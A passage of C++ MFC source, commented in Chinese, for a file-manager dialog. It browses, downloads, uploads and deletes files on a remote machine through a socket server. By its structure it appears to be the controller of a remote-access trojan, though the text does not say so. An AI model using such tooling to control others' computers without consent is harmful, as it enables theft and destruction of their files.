	m_list_remote.InsertColumn(2, "總大小", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "可用空間", LVCFMT_LEFT, 115);


	char	*pDrive = NULL;
	pDrive = (char *)m_bRemoteDriveList;

	unsigned long		AmntMB = 0; // 總大小
	unsigned long		FreeMB = 0; // 剩餘空間
	char				VolName[MAX_PATH];
	char				FileSystem[MAX_PATH];

	/*
	6	DRIVE_FLOPPY
	7	DRIVE_REMOVABLE
	8	DRIVE_FIXED
	9	DRIVE_REMOTE
	10	DRIVE_REMOTE_DISCONNECT
	11	DRIVE_CDROM
	*/
	int	nIconIndex = -1;
	for (int i = 0; pDrive[i] != '\0';)
	{
		if (pDrive[i] == 'A' || pDrive[i] == 'B')
		{
			nIconIndex = 6;
		}
		else
		{
			switch (pDrive[i + 1])
			{
			case DRIVE_REMOVABLE:
				nIconIndex = 7;
				break;
			case DRIVE_FIXED:
				nIconIndex = 8;
				break;
			case DRIVE_REMOTE:
				nIconIndex = 9;
				break;
			case DRIVE_CDROM:
				nIconIndex = 11;
				break;
			default:
				nIconIndex = 8;
				break;		
			}
		}	
		CString	str;
		str.Format("%c:\\", pDrive[i]);
		int	nItem = m_list_remote.InsertItem(i, str, nIconIndex);
		m_list_remote.SetItemData(nItem, 1);
	
		memcpy(&AmntMB, pDrive + i + 2, 4);
		memcpy(&FreeMB, pDrive + i + 6, 4);
		str.Format("%10.1f GB", (float)AmntMB / 1024);
		m_list_remote.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_remote.SetItemText(nItem, 3, str);
		
		i += 10;

		char	*lpFileSystemName = NULL;
		char	*lpTypeName = NULL;

		lpTypeName = pDrive + i;
		i += lstrlen(pDrive + i) + 1;
		lpFileSystemName = pDrive + i;

		// 磁盤類型, 為空就顯示磁盤名稱
		if (lstrlen(lpFileSystemName) == 0)
		{
			m_list_remote.SetItemText(nItem, 1, lpTypeName);
		}
		else
		{
			m_list_remote.SetItemText(nItem, 1, lpFileSystemName);
		}


		i += lstrlen(pDrive + i) + 1;
	}
	// 重置遠程當前路徑
	m_Remote_Path = "";
	m_Remote_Directory_ComboBox.ResetContent();

	ShowMessage("遠程：裝載目錄 %s 完成", m_Remote_Path);
}

void CFileManagerDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	CoUninitialize();
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	CDialog::OnClose();
}

CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
	CString	strCurPath = strPath;
	int Index = strCurPath.ReverseFind('\\');
	if (Index == -1)
	{
		return strCurPath;
	}
	CString str = strCurPath.Left(Index);
	Index = str.ReverseFind('\\');
	if (Index == -1)
	{
		strCurPath = "";
		return strCurPath;
	}
	strCurPath = str.Left(Index);
	
	if(strCurPath.Right(1) != "\\")
		strCurPath += "\\";
	return strCurPath;
}
void CFileManagerDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FILE_LIST: // 文件列表
		FixedRemoteFileList
			(
			m_pContext->m_DeCompressionBuffer.GetBuffer(0),
			m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1
			);
		break;
	case TOKEN_FILE_SIZE: // 傳輸文件時的第一個數據包，文件大小，及文件名
		CreateLocalRecvFile();
		break;
	case TOKEN_FILE_DATA: // 文件內容
		WriteLocalRecvFile();
		break;
	case TOKEN_TRANSFER_FINISH: // 傳輸完成
		EndLocalRecvFile();
		break;
	case TOKEN_CREATEFOLDER_FINISH:
		GetRemoteFileList(".");
		break;
	case TOKEN_DELETE_FINISH:
		EndRemoteDeleteFile();
		break;
	case TOKEN_GET_TRANSFER_MODE:
		SendTransferMode();
		break;
	case TOKEN_DATA_CONTINUE:
		SendFileData();
		break;
	case TOKEN_RENAME_FINISH:
		// 刷新遠程文件列表
		GetRemoteFileList(".");
		break;
	default:
		SendException();
		break;
	}
}

void CFileManagerDlg::GetRemoteFileList(CString directory)
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_remote.GetSelectionMark();

		// 如果有選中的，是目錄
		if (nItem != -1)
		{
			if (m_list_remote.GetItemData(nItem) == 1)
			{
				directory = m_list_remote.GetItemText(nItem, 0);
			}
		}
		// 從組合框裡得到路徑
		else
		{
			m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);
		}
	}
	// 得到父目錄
	if (directory == "..")
	{
		m_Remote_Path = GetParentDirectory(m_Remote_Path);
	}
	else if (directory != ".")
	{	
		m_Remote_Path += directory;
		if(m_Remote_Path.Right(1) != "\\")
			m_Remote_Path += "\\";
	}
	
	// 是驅動器的根目錄,返回磁盤列表
	if (m_Remote_Path.GetLength() == 0)
	{
		FixedRemoteDriveList();
		return;
	}

	// 發送數據前清空緩衝區

	int	PacketSize = m_Remote_Path.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, PacketSize);

	bPacket[0] = COMMAND_LIST_FILES;
	memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, PacketSize);
	LocalFree(bPacket);

	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
	m_Remote_Directory_ComboBox.SetCurSel(0);
	
	// 得到返回數據前禁窗口
	m_list_remote.EnableWindow(FALSE);
	m_ProgressCtrl->SetPos(0);
}
void CFileManagerDlg::OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	if (m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1)
		return;
	// TODO: Add your control notification handler code here
	GetRemoteFileList();
	*pResult = 0;
}

void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
{
	// 重新設置ImageList
	SHFILEINFO	sfi;
	HIMAGELIST hImageListLarge = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_LARGEICON);
	HIMAGELIST hImageListSmall = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	// 重建標題
	m_list_remote.DeleteAllItems();
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "名稱",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "類型", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);


	int	nItemIndex = 0;
	m_list_remote.SetItemData
		(
		m_list_remote.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);
	/*
	ListView 消除閃爍
	更新數據前用SetRedraw(FALSE)   
	更新後調用SetRedraw(TRUE)
	*/
	m_list_remote.SetRedraw(FALSE);

	if (dwBufferLen != 0)
	{
		// 
		for (int i = 0; i < 2; i++)
		{
			// 跳過Token，共5字節
			char *pList = (char *)(pbBuffer + 1);			
			for(char *pBase = pList; pList - pBase < dwBufferLen - 1;)
			{
				char	*pszFileName = NULL;
				DWORD	dwFileSizeHigh = 0; // 文件高字節大小
				DWORD	dwFileSizeLow = 0; // 文件低字節大小
				int		nItem = 0;
				bool	bIsInsert = false;
				FILETIME	ftm_strReceiveLocalFileTime;

				int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i 為 0 時，列目錄，i為1時列文件
				bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
				pszFileName = ++pList;

				if (bIsInsert)
				{
					nItem = m_list_remote.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
					m_list_remote.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
					SHFILEINFO	sfi;
					SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL | nType, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
					m_list_remote.SetItemText(nItem, 2, sfi.szTypeName);
				}

				// 得到文件大小
				pList += lstrlen(pszFileName) + 1;
				if (bIsInsert)
				{
					memcpy(&dwFileSizeHigh, pList, 4);
					memcpy(&dwFileSizeLow, pList + 4, 4);
					CString strSize;
					strSize.Format("%10d KB", (dwFileSizeHigh * (MAXDWORD+1)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
					m_list_remote.SetItemText(nItem, 1, strSize);
					memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
					CTime	time(ftm_strReceiveLocalFileTime);
					m_list_remote.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));	
				}
				pList += 16;
			}
		}
	}

	m_list_remote.SetRedraw(TRUE);
	// 恢復窗口
	m_list_remote.EnableWindow(TRUE);

	ShowMessage("遠程：裝載目錄 %s 完成", m_Remote_Path);
}

void CFileManagerDlg::ShowMessage(char *lpFmt, ...)
{
	char buff[1024];
    va_list    arglist;
    va_start( arglist, lpFmt );
	
	memset(buff, 0, sizeof(buff));

	vsprintf(buff, lpFmt, arglist);
	m_wndStatusBar.SetPaneText(0, buff);
    va_end( arglist );
}

void CFileManagerDlg::OnLocalPrev() 
{
	// TODO: Add your command handler code here
	FixedLocalFileList("..");
}

void CFileManagerDlg::OnRemotePrev() 
{
	// TODO: Add your command handler code here
	GetRemoteFileList("..");
}

void CFileManagerDlg::OnLocalView() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}

// 在工具欄上顯示ToolTip
BOOL CFileManagerDlg::OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult)
{
	ASSERT(pNMHDR->code == TTN_NEEDTEXTA || pNMHDR->code == TTN_NEEDTEXTW);
	//讓上一層的邊框窗口優先處理該消息
	if (GetRoutingFrame() != NULL)
	return FALSE;


	//分ANSI and UNICODE兩個處理版本
	TOOLTIPTEXTA* pTTTA = (TOOLTIPTEXTA*)pNMHDR;
	TOOLTIPTEXTW* pTTTW = (TOOLTIPTEXTW*)pNMHDR;
	TCHAR szFullText[256];

	CString strTipText;
	UINT nID = pNMHDR->idFrom;

	//如果idFrom是一個子窗口，則得到其ID。

	if (
		pNMHDR->code == TTN_NEEDTEXTA 
		&& (pTTTA->uFlags & TTF_IDISHWND) 
		|| pNMHDR->code == TTN_NEEDTEXTW 
		&& (pTTTW->uFlags & TTF_IDISHWND)
		)
	{
		//idFrom是工具條的句柄	
		nID = ::GetDlgCtrlID((HWND)nID);
	}

	if (nID != 0) //若是0，為一分隔欄，不是按鈕
	{
		//得到nID對應的字符串
		AfxLoadString(nID, szFullText);
		//從上面得到的字符串中取出Tooltip使用的文本
		AfxExtractSubString(strTipText, szFullText, 1, '\n');	
	}

	//複製分離出的文本
	#ifndef _UNICODE
	if (pNMHDR->code == TTN_NEEDTEXTA)
	lstrcpyn(pTTTA->szText, strTipText, sizeof(pTTTA->szText));
	else
	_mbstowcsz(pTTTW->szText, strTipText, sizeof(pTTTW->szText));
	#else
	if (pNMHDR->code == TTN_NEEDTEXTA)
	_wcstombsz(pTTTA->szText, strTipText, sizeof(pTTTA->szText));
	else
	lstrcpyn(pTTTW->szText, strTipText, sizeof(pTTTW->szText));
	#endif
	*pResult = 0;
	//顯示Tooltip窗口
	::SetWindowPos(pNMHDR->hwndFrom, HWND_TOP, 0, 0, 0, 0, SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
	return TRUE; //消息處理完畢
}

//////////////////////////////////以下為工具欄響應處理//////////////////////////////////////////
void CFileManagerDlg::OnLocalList() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}

void CFileManagerDlg::OnLocalReport() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}

void CFileManagerDlg::OnLocalBigicon() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}

void CFileManagerDlg::OnLocalSmallicon() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);	
}

void CFileManagerDlg::OnRemoteList() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}

void CFileManagerDlg::OnRemoteReport() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}

void CFileManagerDlg::OnRemoteBigicon() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}

void CFileManagerDlg::OnRemoteSmallicon() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);	
}

void CFileManagerDlg::OnRemoteView() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}


// 為根目錄時禁用向上按鈕
void CFileManagerDlg::OnUpdateLocalPrev(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateLocalDelete(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	// 不是根目錄，並且選擇項目大於0
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.GetSelectedCount()  && m_list_local.IsWindowEnabled());		
}

void CFileManagerDlg::OnUpdateLocalNewfolder(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateLocalCopy(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here

	pCmdUI->Enable
		(
		m_list_local.IsWindowEnabled()
		&& (m_Remote_Path.GetLength() || m_list_remote.GetSelectedCount()) // 遠程路徑為空，或者有選擇
		&& m_list_local.GetSelectedCount()// 本地路徑為空，或者有選擇
		);
}


void CFileManagerDlg::OnUpdateLocalStop(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(!m_list_local.IsWindowEnabled() && m_bIsUpload);

}

void CFileManagerDlg::OnUpdateRemotePrev(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteCopy(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	// 不是根目錄，並且選擇項目大於0
	pCmdUI->Enable
		(
		m_list_remote.IsWindowEnabled()
		&& (m_Local_Path.GetLength() || m_list_local.GetSelectedCount()) // 本地路徑為空，或者有選擇
		&& m_list_remote.GetSelectedCount() // 遠程路徑為空，或者有選擇
		);	
}

void CFileManagerDlg::OnUpdateRemoteDelete(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	// 不是根目錄，並且選擇項目大於0
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.GetSelectedCount() && m_list_remote.IsWindowEnabled());		
}

void CFileManagerDlg::OnUpdateRemoteNewfolder(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteStop(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(!m_list_remote.IsWindowEnabled() && !m_bIsUpload);
}
bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)
{
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	
	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);

	
	WIN32_FIND_DATA	wfd;
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果沒有找到或查找失敗
		return FALSE;
	
	do
	{ 
		if (wfd.cFileName[0] == '.') 
			continue; // 過濾這兩個目錄 
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{ 
			char strDirectory[MAX_PATH];
			wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			FixedUploadDirectory(strDirectory); // 如果找到的是目錄，則進入此目錄進行遞歸 
		} 
		else 
		{ 
			CString file;
			file.Format("%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			//printf("send file %s\n",strFile);
			m_Remote_Upload_Job.AddTail(file);
			// 對文件進行操作 
		} 
	} while (FindNextFile(hFind, &wfd)); 
	FindClose(hFind); // 關閉查找句柄
	return true;
}

void CFileManagerDlg::EnableControl(BOOL bEnable)
{
	m_list_local.EnableWindow(bEnable);
	m_list_remote.EnableWindow(bEnable);
	m_Local_Directory_ComboBox.EnableWindow(bEnable);
	m_Remote_Directory_ComboBox.EnableWindow(bEnable);
}
void CFileManagerDlg::OnLocalCopy() 
{
	m_bIsUpload = true;
	// TODO: Add your command handler code here

	// TODO: Add your command handler code here
	// 如果Drag的，找到Drop到了哪個文件夾
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
	// 重置上傳任務列表
	m_Remote_Upload_Job.RemoveAll();
	POSITION pos = m_list_local.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
		// 如果是目錄
		if (m_list_local.GetItemData(nItem))
		{
			file += '\\';
			FixedUploadDirectory(file.GetBuffer(0));
		}
		else
		{
			// 添加到上傳任務列表中去
			m_Remote_Upload_Job.AddTail(file);
		}

	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
	if (m_Remote_Upload_Job.IsEmpty())
	{
		::MessageBox(m_hWnd, "文件夾為空", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	EnableControl(FALSE);
	SendUploadJob();
}

//////////////// 文件傳輸操作 ////////////////
// 只管發出了下載的文件
// 一個一個發，接收到下載完成時，下載第二個文件 ...
void CFileManagerDlg::OnRemoteCopy()
{
	m_bIsUpload = false;
	// 禁用文件管理窗口
	EnableControl(FALSE);

	// TODO: Add your command handler code here
	// 如果Drag的，找到Drop到了哪個文件夾
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
	// 重置下載任務列表
	m_Remote_Download_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// 如果是目錄
		if (m_list_remote.GetItemData(nItem))
			file += '\\';
		// 添加到下載任務列表中去
		m_Remote_Download_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	// 發送第一個下載任務
	SendDownloadJob();
}

// 發出一個下載任務
BOOL CFileManagerDlg::SendDownloadJob()
{

	if (m_Remote_Download_Job.IsEmpty())
		return FALSE;

	// 發出第一個下載任務命令
	CString file = m_Remote_Download_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
 	bPacket[0] = COMMAND_DOWN_FILES;
 	// 文件偏移，續傳時用
 	memcpy(bPacket + 1, file.GetBuffer(0), file.GetLength() + 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	// 從下載任務列表中刪除自己
	m_Remote_Download_Job.RemoveHead();
	return TRUE;
}

// 發出一個上傳任務
BOOL CFileManagerDlg::SendUploadJob()
{
	if (m_Remote_Upload_Job.IsEmpty())
		return FALSE;

	CString	strDestDirectory = m_Remote_Path;
	// 如果遠程也有選擇，當做目標文件夾
	int nItem = m_list_remote.GetSelectionMark();
	
	// 是文件夾
	if (nItem != -1 && m_list_remote.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_remote.GetItemText(nItem, 0) + "\\";
	}
	
	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}

	// 發出第一個下載任務命令
	m_strOperatingFile = m_Remote_Upload_Job.GetHead();
	
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字節token, 8字節大小, 文件名稱, '\0'
	HANDLE	hFile;
	CString	fileRemote = m_strOperatingFile; // 遠程文件
	// 得到要保存到的遠程的文件路徑
	fileRemote.Replace(m_Local_Path, strDestDirectory);
	m_strUploadRemoteFile = fileRemote;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;

	CloseHandle(hFile);
	// 構造數據包，發送文件長度
	int		nPacketSize = fileRemote.GetLength() + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = COMMAND_FILE_SIZE;
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);
	
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);

	// 從下載任務列表中刪除自己
	m_Remote_Upload_Job.RemoveHead();
	return TRUE;
}

// 發出一個刪除任務
BOOL CFileManagerDlg::SendDeleteJob()
{
	if (m_Remote_Delete_Job.IsEmpty())
		return FALSE;
	// 發出第一個下載任務命令
	CString file = m_Remote_Delete_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);

	if (file.GetAt(file.GetLength() - 1) == '\\')
	{
		ShowMessage("遠程：刪除目錄 %s\*.* 完成", file);
		bPacket[0] = COMMAND_DELETE_DIRECTORY;
	}
	else
	{
		ShowMessage("遠程：刪除文件 %s 完成", file);
		bPacket[0] = COMMAND_DELETE_FILE;
	}
	// 文件偏移，續傳時用
	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
	
	LocalFree(bPacket);
	// 從下載任務列表中刪除自己
	m_Remote_Delete_Job.RemoveHead();
	return TRUE;
}

void CFileManagerDlg::CreateLocalRecvFile()
{
	// 重置計數器
	m_nCounter = 0;

	CString	strDestDirectory = m_Local_Path;
	// 如果本地也有選擇，當做目標文件夾
	int nItem = m_list_local.GetSelectionMark();

	// 是文件夾
	if (nItem != -1 && m_list_local.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_local.GetItemText(nItem, 0) + "\\";
	}

	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}

	FILESIZE	*pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
	DWORD	dwSizeLow = pFileSize->dwSizeLow;

	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;

	// 當前正操作的文件名
	m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);

	m_strReceiveLocalFile = m_strOperatingFile;

	// 得到要保存到的本地的文件路徑
	m_strReceiveLocalFile.Replace(m_Remote_Path, strDestDirectory);
	
	// 創建多層目錄
	MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));


	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);


	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{

		CFileTransferModeDlg	dlg(this);
		dlg.m_strFileName = m_strReceiveLocalFile;
		switch (dlg.DoModal())
		{
		case IDC_OVERWRITE:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE;
			break;
		case IDC_OVERWRITE_ALL:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
			break;
		case IDC_ADDITION:
			m_nTransferMode = TRANSFER_MODE_ADDITION;
			break;
		case IDC_ADDITION_ALL:
			m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
			break;
		case IDC_JUMP:
			m_nTransferMode = TRANSFER_MODE_JUMP;
			break;
		case IDC_JUMP_ALL:
			m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
			break;
		case IDC_CANCEL:
			m_nTransferMode = TRANSFER_MODE_CANCEL;
			break;
		}
	}

	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		// 取消傳送
		m_bIsStop = true;
		SendStop();
		return;
	}
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}

	//  1字節Token,四字節偏移高四位，四字節偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打開方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = COMMAND_CONTINUE;

	// 文件已經存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示點什麼
		// 如果是續傳
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			// 接收的長度遞增
			m_nCounter += FindFileData.nFileSizeHigh * (MAXDWORD+1);
			m_nCounter += FindFileData.nFileSizeLow;

			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆蓋
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新創建
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// 跳過，指針移到-1
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			m_ProgressCtrl->SetPos(100);
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新創建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);


	HANDLE	hFile = 
		CreateFile
		(
		m_strReceiveLocalFile.GetBuffer(0), 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要錯誤處理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nOperatingFileLength = 0;
		m_nCounter = 0;
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " 文件創建失敗", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	CloseHandle(hFile);

	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		// 發送繼續傳輸文件的token,包含文件續傳的偏移
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}
// 寫入文件內容

void CFileManagerDlg::WriteLocalRecvFile()
{

	// 傳輸完畢
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  數據包頭部大小，為固定的9
	FILESIZE	*pFileSize;
	// 得到數據的偏移
	pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);

	pFileSize = (FILESIZE *)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	// 得到數據在文件中的偏移, 賦值給計數器
	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;


	dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	HANDLE	hFile = 
		CreateFile
		(
		m_strReceiveLocalFile.GetBuffer(0), 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);

